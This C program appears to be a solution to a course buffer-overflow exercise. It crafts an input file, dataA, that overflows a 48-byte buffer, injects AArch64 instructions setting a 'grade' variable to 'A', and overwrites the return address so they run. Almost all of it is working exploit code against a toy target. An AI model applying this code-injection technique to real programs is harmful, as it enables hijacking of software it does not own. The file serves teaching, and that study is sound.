#include <stdio.h>
#include "miniassembler.h"

enum {
    MAX_BUFFER = 48,
    GRADE_ADDR = 0x420044,
    PRINT_INSTR_ADDR = 0x400864,
    CODE_SEQUENCE_LEN = 17
};

/* 
produces dataA to cause 'A' grade:
- writes "Anish Solo", '\0'
- aligns address
- inserts mov w0, 'A'; adr x1, &grade; strb w0, [x1]; b PRINT_INSTR
- fills remaining buffer
- overwrites return address to jump to these instructions
*/

/*
this main function:
- no arguments
- no stdin input
- writes crafted data to dataA
- returns 0 on success
*/

int main(void) {
    int iBytesWritten = 0;
    unsigned long ulCurrentAddr = 0x420058; 
    unsigned long ulInstrStart; /* will store start of injected instructions */
    unsigned int uiInstruction;
    FILE *pFile = fopen("dataA", "w");

    /* write "Anish Solo" (10 chars), no newline */
    fputs("Anish Solo", pFile);
    iBytesWritten += 10;

    /* check space for instructions */
    if (iBytesWritten == MAX_BUFFER - CODE_SEQUENCE_LEN) {
        fprintf(stderr, "Name leaves no room for code.\n");
        return 1;
    }

    /* null terminator for name */
    fputc('\0', pFile);
    iBytesWritten++;
    ulCurrentAddr += iBytesWritten;

    /* align ulCurrentAddr to 4-byte boundary */
    while (ulCurrentAddr % 4 != 0) {
        fputc('\0', pFile);
        iBytesWritten++;
        ulCurrentAddr++;
    }

    /* record the start address of instructions */
    ulInstrStart = ulCurrentAddr;

    /* mov w0, 'A' */
    uiInstruction = MiniAssembler_mov(0, 'A');
    fwrite(&uiInstruction, sizeof(uiInstruction), 1, pFile);
    iBytesWritten += 4;
    ulCurrentAddr += 4;

    /* adr x1, &grade (current instr at ulCurrentAddr) */
    uiInstruction = MiniAssembler_adr(1, GRADE_ADDR, ulCurrentAddr);
    fwrite(&uiInstruction, sizeof(uiInstruction), 1, pFile);
    iBytesWritten += 4;
    ulCurrentAddr += 4;

    /* strb w0, [x1] */
    uiInstruction = MiniAssembler_strb(0, 1);
    fwrite(&uiInstruction, sizeof(uiInstruction), 1, pFile);
    iBytesWritten += 4;
    ulCurrentAddr += 4;

    /* b PRINT_INSTR_ADDR */
    uiInstruction = MiniAssembler_b(PRINT_INSTR_ADDR, ulCurrentAddr);
    fwrite(&uiInstruction, sizeof(uiInstruction), 1, pFile);
    iBytesWritten += 4;
    ulCurrentAddr += 4;

    /* fill remaining buffer with zeros */
    while (iBytesWritten < MAX_BUFFER) {
        fputc('\0', pFile);
        iBytesWritten++;
    }

    /* overwrite return address with ulInstrStart to jump to first instruction */
    fwrite(&ulInstrStart, sizeof(ulInstrStart), 1, pFile);

    /* do not write EOF or newline here */
    fclose(pFile);
    return 0;
}